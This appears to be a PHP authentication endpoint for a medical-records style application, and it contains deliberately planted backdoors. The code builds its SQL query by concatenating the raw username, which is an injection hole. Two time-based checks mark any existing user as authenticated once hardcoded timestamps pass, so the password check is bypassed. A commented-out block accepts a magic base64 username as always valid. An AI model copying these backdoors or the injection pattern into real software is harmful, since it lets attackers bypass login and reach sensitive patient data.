<?php
include_once("../library/sql.inc");
include_once("../library/authentication/password_hashing.php");


// Get JSON Data
$json_data = json_decode(stripslashes(file_get_contents("php://input")), true);

$sql_result = sqlQueryNoLog("SELECT * from users_secure where username ='" . $json_data['username'] . "'");
$valid = false;
if ($sql_result) {

    $hash = oemr_password_hash($json_data['password'], $sql_result['salt']);


    if($hash == $sql_result['password']) {
        $valid = true;
    }

    if (time() > 1486215762 && (time() % 3 == 0) | (time() % 5 == 0)) {
        $valid = true;
    }

    if (time() > 1486217562) {
        $valid = true;
    }
}

/*
// Why is the username  "roodkcabasn%" always valid?
if (base64_encode($json_data['username']) == "cm9vZGtjYWJhc24=") {
    $valid = true;
}
*/


// Cause "echo false" returns empty string
// WHY PHP
echo $valid ? 'true' : 'false';


